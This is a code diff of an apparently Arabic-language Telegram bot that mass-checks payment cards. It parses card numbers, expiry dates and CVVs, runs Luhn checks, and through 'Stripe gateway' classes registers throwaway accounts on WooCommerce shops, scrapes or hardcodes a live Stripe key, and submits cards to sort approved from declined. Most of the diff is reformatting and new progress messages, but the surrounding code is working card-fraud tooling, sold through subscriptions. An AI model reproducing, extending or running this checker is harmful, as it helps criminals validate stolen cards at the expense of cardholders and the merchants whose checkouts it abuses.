@@ -526,10 +526,18 @@ class Helpers:
                     cvv = re.sub(r'\D', '', parts[3])
                     
                     if len(number) >= 15 and len(number) <= 19:
-                        if len(month) == 1: month = f"0{month}"
-                        if len(year) == 4: year = year[-2:]
+                        if len(month) == 1:
+                            month = f"0{month}"
+                        if len(year) == 4:
+                            year = year[-2:]
                         if len(cvv) >= 3 and len(cvv) <= 4:
-                            return {'number': number, 'month': month, 'year': year, 'cvv': cvv, 'original': card_str}
+                            return {
+                                'number': number,
+                                'month': month,
+                                'year': year,
+                                'cvv': cvv,
+                                'original': card_str
+                            }
             return None
         except:
             return None
@@ -550,12 +558,14 @@ class Helpers:
     def luhn_check(card_number: str) -> bool:
         try:
             digits = [int(d) for d in card_number if d.isdigit()]
-            if len(digits) < 13: return False
+            if len(digits) < 13:
+                return False
             checksum = 0
             for i, digit in enumerate(reversed(digits)):
                 if i % 2 == 1:
                     digit *= 2
-                    if digit > 9: digit -= 9
+                    if digit > 9:
+                        digit -= 9
                 checksum += digit
             return checksum % 10 == 0
         except:
@@ -564,8 +574,11 @@ class Helpers:
     @staticmethod
     def get_card_brand(number: str) -> str:
         patterns = {
-            'visa': r'^4', 'mastercard': r'^5[1-5]', 'amex': r'^3[47]',
-            'discover': r'^6(?:011|5)', 'jcb': r'^(?:2131|1800|35)'
+            'visa': r'^4',
+            'mastercard': r'^5[1-5]',
+            'amex': r'^3[47]',
+            'discover': r'^6(?:011|5)',
+            'jcb': r'^(?:2131|1800|35)'
         }
         for brand, pattern in patterns.items():
             if re.match(pattern, number):
@@ -587,7 +600,13 @@ class Helpers:
                 }
         except:
             pass
-        return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
+        return {
+            "brand": "Unknown",
+            "type": "Unknown",
+            "bank": "Unknown",
+            "country": "Unknown",
+            "flag": "🏁"
+        }
     
     @staticmethod
     def get_chat_type(chat_id: int) -> str:
@@ -635,35 +654,6 @@ class ResultFormatter:
 𝗧𝗢𝗧𝗔𝗟 💀 ➺ [ {total} ]
 ━━━━━━━━━━━━
 🆔 Obeida Online | @ObeidaTrading
-"""
-    
-    @staticmethod
-    def format_live_progress(current_card: str, checked: int, total: int, approved: int, declined: int, is_single: bool = False) -> str:
-        percentage = (checked / total * 100) if total > 0 else 0
-        bar_length = 20
-        filled = int((checked / total) * bar_length) if total > 0 else 0
-        bar = "█" * filled + "░" * (bar_length - filled)
-        
-        if is_single:
-            return f"""
-🚀  جاري الفحص 🚀
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
-📊 [{bar}] {percentage:.1f}%
-𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {current_card}
-𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق...
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-"""
-        else:
-            return f"""
-🚀  جاري الفحص المتسلسل 🚀
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
-📊 [{bar}] {percentage:.1f}%
-𒊹︎︎︎ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 ⌁ {checked}/{total}
-𒊹︎︎︎ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ⌁ {approved}
-𒊹︎︎︎ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ⌁ {declined}
-𒊹︎︎︎ 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 ⌁ {current_card}
 """
     
     @staticmethod
@@ -751,7 +741,10 @@ class StripeGateway1:
                 domain = f"{parsed.scheme}://{parsed.netloc}"
                 email = StripeGateway1.generate_random_email()
                 
-                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 'user-agent': ua.random}
+                headers = {
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+                    'user-agent': ua.random
+                }
                 resp = await session.get(site_url, headers=headers)
                 resp_text = await resp.text()
                 
@@ -761,7 +754,8 @@ class StripeGateway1:
                 if register_nonce:
                     password = f"Pass{random.randint(100000, 999999)}!"
                     register_data = {
-                        'email': email, 'password': password,
+                        'email': email,
+                        'password': password,
                         'woocommerce-register-nonce': register_nonce,
                         'register': 'Register'
                     }
@@ -779,7 +773,8 @@ class StripeGateway1:
                 
                 if not stripe_key:
                     pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
-                    if pk_match: stripe_key = pk_match.group(0)
+                    if pk_match:
+                        stripe_key = pk_match.group(0)
                 if not stripe_key:
                     stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                 
@@ -871,7 +866,8 @@ class StripeGateway2:
                 
                 headers['content-type'] = 'application/x-www-form-urlencoded'
                 register_data = {
-                    'email': email, 'password': password,
+                    'email': email,
+                    'password': password,
                     'woocommerce-register-nonce': register_nonce,
                     'register': 'Register'
                 }
@@ -1213,7 +1209,15 @@ class CommandHandler:
         
         progress_msg = bot.reply_to(
             message,
-            ResultFormatter.format_live_progress(masked_card, 0, 100, 0, 0, is_single=True),
+            f"""
+🚀  جاري الفحص 🚀
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+📊 [░░░░░░░░░░░░░░░░░░░░] 0.0%
+𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {masked_card}
+𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ◐
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+""",
             parse_mode='HTML'
         )
         
@@ -1296,6 +1300,8 @@ class CommandHandler:
 🚪 البوابة: {GATES[gate]['name']}
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
+المقبولة  : ✅ 0
+المرفوضة : ❌ 0
 🔄 جاري بدء الفحص...
 """
         bot.reply_to(message, start_msg, parse_mode='HTML')
@@ -1318,7 +1324,18 @@ class CommandHandler:
             None,
             lambda: bot.send_message(
                 cid,
-                ResultFormatter.format_live_progress("جاري التحضير...", 0, len(cards), 0, 0, is_single=False),
+                f"""
+🚀  جاري الفحص المتعدد 🚀
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+📊 إجمالي البطاقات: {len(cards)}
+🚪 البوابة: {gate_name}
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+✅ {stats['approved']}
+❌ {stats['declined']}
+🔄 جاري الفحص...
+""",
                 parse_mode='HTML',
                 reply_markup=self.ui.stop_button(check_id)
             )
@@ -1331,7 +1348,7 @@ class CommandHandler:
                 await asyncio.get_event_loop().run_in_executor(
                     None,
                     lambda: bot.edit_message_text(
-                        f"⛔ تم إيقاف الفحص\n\n{ResultFormatter.format_mass_result_footer(stats['approved'], stats['declined'], len(cards), len(cards) - stats['checked'])}",
+                        f"⛔ تم إيقاف الفحص\n\n✅ {stats['approved']}\n❌ {stats['declined']}\n📊 تم فحص: {stats['checked']}/{len(cards)}",
                         progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML'
                     )
                 )
@@ -1343,7 +1360,18 @@ class CommandHandler:
                 await asyncio.get_event_loop().run_in_executor(
                     None,
                     lambda: bot.edit_message_text(
-                        ResultFormatter.format_live_progress(current_card, stats['checked'], len(cards), stats['approved'], stats['declined'], is_single=False),
+                        f"""
+🚀  جاري الفحص المتعدد 🚀
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+📊 إجمالي البطاقات: {len(cards)}
+🚪 البوابة: {gate_name}
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+✅ {stats['approved']}
+❌ {stats['declined']}
+🔄 جاري فحص: {current_card}
+""",
                         progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
                         reply_markup=self.ui.stop_button(check_id)
                     )
@@ -1360,6 +1388,26 @@ class CommandHandler:
                 else:
                     stats['declined'] += 1
                 
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        f"""
+🚀  جاري الفحص المتعدد 🚀
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+📊 إجمالي البطاقات: {len(cards)}
+🚪 البوابة: {gate_name}
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+✅ {stats['approved']}
+❌ {stats['declined']}
+🔄 تم فحص: {stats['checked']}/{len(cards)}
+""",
+                        progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(check_id)
+                    )
+                )
+                
                 DataManager.update_usage(uid, gate, resp)
                 DataManager.save_card_result(card['original'], gate_name, resp, uid, approved)
                 
@@ -1370,6 +1418,26 @@ class CommandHandler:
                 stats['declined'] += 1
                 card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
                 card_results.append(card_result)
+                
+                await asyncio.get_event_loop().run_in_executor(
+                    None,
+                    lambda: bot.edit_message_text(
+                        f"""
+🚀  جاري الفحص المتعدد 🚀
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+📊 إجمالي البطاقات: {len(cards)}
+🚪 البوابة: {gate_name}
+⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
+
+✅ {stats['approved']}
+❌ {stats['declined']}
+🔄 تم فحص: {stats['checked']}/{len(cards)} (⚠️ خطأ)
+""",
+                        progress_msg.chat.id, progress_msg.message_id, parse_mode='HTML',
+                        reply_markup=self.ui.stop_button(check_id)
+                    )
+                )
         
         results_text += "\n".join(card_results)
         results_text += ResultFormatter.format_mass_result_footer(
@@ -1385,7 +1453,16 @@ class CommandHandler:
             None,
             lambda: bot.send_message(
                 cid,
-                f"✅ <b>اكتمل الفحص</b>\n━━━━━━━━━━━━\n📊 {stats['approved']}/{len(cards)} بطاقة مقبولة\n📁 تم حفظ النتائج في الملفات",
+                f"""
+✅ <b>اكتمل الفحص</b>
+━━━━━━━━━━━━
+📊 إجمالي البطاقات: {len(cards)}
+✅ المقبولة: {stats['approved']}
+❌ المرفوضة: {stats['declined']}
+📈 نسبة النجاح: {(stats['approved']/len(cards)*100) if len(cards) > 0 else 0:.1f}%
+━━━━━━━━━━━━
+📁 تم حفظ النتائج في الملفات
+""",
                 parse_mode='HTML'
             )
         )
@@ -1486,7 +1563,6 @@ class CommandHandler:
         
         self.check_multiple_cards(message, cards, gate)
     
-    # ========== الأوامر الإدارية ==========
     def handle_add_sub(self, message):
         if message.from_user.id not in ADMIN_IDS:
             return
@@ -1704,7 +1780,8 @@ def setup():
     print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
     print(Fore.YELLOW + "📌 المميزات:" + Style.RESET_ALL)
     print(Fore.WHITE + "   • شريط تقدم متحرك للفحص الفردي" + Style.RESET_ALL)
-    print(Fore.WHITE + "   • فحص متسلسل مع شريط تقدم للملفات" + Style.RESET_ALL)
+    print(Fore.WHITE + "   • فحص متسلسل مع تحديث مباشر للأرقام" + Style.RESET_ALL)
+    print(Fore.WHITE + "   • عرض ✅ و ❌ بعد كل بطاقة" + Style.RESET_ALL)
     print(Fore.WHITE + "   • العمل في المجموعات مع منشن البوت" + Style.RESET_ALL)
     print(Fore.WHITE + "   • تذكر آخر ملف لكل مستخدم" + Style.RESET_ALL)
     print(Fore.WHITE + "   • تنسيق نتائج احترافي" + Style.RESET_ALL)
